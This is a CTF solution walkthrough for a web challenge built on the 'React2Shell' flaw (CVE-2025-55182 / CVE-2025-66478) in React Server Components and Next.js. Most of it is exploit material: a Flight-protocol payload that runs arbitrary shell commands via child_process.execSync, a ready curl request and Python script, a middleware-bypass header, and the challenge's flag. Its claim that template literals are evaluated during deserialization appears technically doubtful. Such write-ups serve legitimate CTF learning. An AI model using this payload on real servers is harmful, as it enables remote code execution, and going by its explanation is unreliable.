# 封印解放 — Forbidden Zanpakutō Compiler

## Intended Solution Walkthrough

**Category:** Web | **Difficulty:** Insane | **CVE:** CVE-2025-55182 / CVE-2025-66478

---

## Overview

This challenge exploits the **React2Shell** vulnerability — a critical pre-authentication Remote Code Execution (RCE) flaw in React Server Components (RSC). The vulnerability exists in how the React Flight protocol deserializes payloads, allowing attackers to execute arbitrary code on the server.

---

## Step 1: Initial Reconnaissance

### 1.1 Access the Application

```bash
# Open the challenge in browser
http://<INSTANCE>:3000
```

You'll see the **Hōōden Sealed Archive** — a Bleach-themed document reconstruction system.

### 1.2 Explore the UI

Navigate through the available pages:
- **Homepage** (`/`) — Shows scroll index with various classification levels
- **Compiler** (`/compiler`) — Interactive terminal for "spirit-thread harmonization"
- **Auth** (`/auth`) — Barrier authentication (red herring)

### 1.3 Identify Technology Stack

Check the response headers:

```bash
curl -I http://localhost:3000/compiler
```

Look for:
```
Vary: RSC, Next-Router-State-Tree
```

This indicates **React Server Components** are in use.

---

## Step 2: Understanding the Target

### 2.1 Interact with the Compiler

1. Go to `/compiler`
2. Enter any text in the terminal (e.g., "test")
3. Click "Harmonize"
4. Observe the response in the terminal

### 2.2 Inspect Network Traffic

Open browser DevTools → Network tab:

1. Click "Harmonize" with some input
2. Observe the POST request to `/compiler`
3. Note the **request headers**:
   - `Content-Type: text/x-component`
   - `RSC: 1`
   - `Next-Action: <action_id>`

### 2.3 Identify the Server Action

The request payload uses the **React Flight protocol** — a binary-ish format for streaming React components between server and client.

Example request body:
```
["test"]
```

The `Next-Action` header contains a hashed identifier for the Server Action function.

---

## Step 3: Research the Vulnerability

### 3.1 CVE Information

- **CVE-2025-55182** (React) / **CVE-2025-66478** (Next.js)
- **Type:** Unsafe deserialization in React Flight protocol
- **CVSS:** 10.0 (Critical)
- **Affected Versions:**
  - Next.js: 15.0.0 - 15.5.6, 16.0.0 - 16.0.6
  - React: 19.0.0 - 19.2.0

### 3.2 Vulnerability Mechanism

The React Flight protocol uses a streaming JSON-like format where each line represents a "chunk":

```
<id>:<type><json_data>

Types:
- (no prefix) = Data/module chunk
- E           = Error chunk
- $ references = Cross-references to other chunks
```

The vulnerability exists because certain payload structures with template literals are evaluated during deserialization, allowing code injection.

---

## Step 4: Craft the Exploit Payload

### 4.1 Malicious Flight Payload Structure

```
0:{"a":"$@1","f":"","b":"development"}
1:E{"digest":"${require('child_process').execSync('COMMAND').toString()}","message":"REACT2SHELL","stack":[],"environmentName":"Server"}
```

**Explanation:**
- **Line 0:** Creates a reference `$@1` pointing to chunk ID 1
- **Line 1:** Error chunk (`E` prefix) with a template literal in the `digest` field
- When RSC deserializes, the template literal `${...}` is evaluated
- This executes `require('child_process').execSync('COMMAND')`

### 4.2 Required Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Type` | `text/x-component` | Identifies RSC request format |
| `RSC` | `1` | Enables React Server Component mode |
| `Next-Action` | (any value) | Triggers Server Action handler |
| `x-middleware-subrequest` | `1` | (Optional) Bypasses middleware checks |

---

## Step 5: Execute the Exploit

### Method A: Using curl

```bash
curl -X POST 'http://localhost:3000/compiler' \
  -H 'Content-Type: text/x-component' \
  -H 'RSC: 1' \
  -H 'Next-Action: 1' \
  -H 'x-middleware-subrequest: 1' \
  --data-binary $'0:{"a":"$@1","f":"","b":"development"}\n1:E{"digest":"${require(\'child_process\').execSync(\'cat /flag.txt\').toString()}","message":"NEXT_REDIRECT","stack":[],"environmentName":"Server"}'
```

### Method B: Using Python

```python
import requests

target = "http://localhost:3000"
command = "cat /flag.txt"

payload = f'''0:{{"a":"$@1","f":"","b":"development"}}
1:E{{"digest":"${{require('child_process').execSync('{command}').toString()}}","message":"REACT2SHELL","stack":[],"environmentName":"Server"}}'''

headers = {
    "Content-Type": "text/x-component",
    "RSC": "1",
    "Next-Action": "1",
    "x-middleware-subrequest": "1",
}

response = requests.post(f"{target}/compiler", headers=headers, data=payload)
print(response.text)
```

### Method C: Using the Provided Exploit Script

```bash
cd solve/
python3 exploit.py http://localhost:3000 'cat /flag.txt'
```

---

## Step 6: Extract the Flag

The command output appears in the server's error response, typically in the `digest` field or error message body.

**Look for the flag pattern:** `L3m0nCTF{...}`

---

## Flag

```
L3m0nCTF{Ky0ug0ku_n0_K0t0tsu_B4NK41}
```

---

## Common Pitfalls & Troubleshooting

### Issue: "No RSC response"

**Solution:** Ensure the `Content-Type` is exactly `text/x-component`

### Issue: "Middleware blocking request"

**Solution:** Add the `x-middleware-subrequest: 1` header

### Issue: "No output in response"

**Solution:** Check if the command ran but output is elsewhere:
```bash
# Try writing to a file and reading it
cat /flag.txt > /tmp/out && cat /tmp/out
```

### Issue: "Action ID required"

**Solution:** 
1. Intercept a legitimate request in DevTools
2. Copy the `Next-Action` header value
3. Use it in your exploit request

---

## Red Herrings in This Challenge

1. **Forbidden patterns** (`藍染`, `崩玉`, `鏡花水月`) — These are just input filters in the application logic, not related to the actual vulnerability
2. **Auth page** (`/auth`) — Misdirection; the vulnerability is pre-auth
3. **Diagnostic function** — Displays a fake version number as misdirection
4. **HTML comments** — Hint at "Urahara's serialization prototype" (points toward Flight protocol)

---

## References

- [Next.js Security Advisory GHSA-9qr9-h5gf-34mp](https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp)
- [React Security Advisory GHSA-fv66-9v8q-g76r](https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r)
- [react2shell.com](https://react2shell.com)
- [Original PoC Repository](https://github.com/nehkark/CVE-2025-55182)

---

## TL;DR Quick Solve

```bash
python3 solve/exploit.py http://<INSTANCE>:3000 'cat /flag.txt'
```

**Flag:** `L3m0nCTF{Ky0ug0ku_n0_K0t0tsu_B4NK41}`
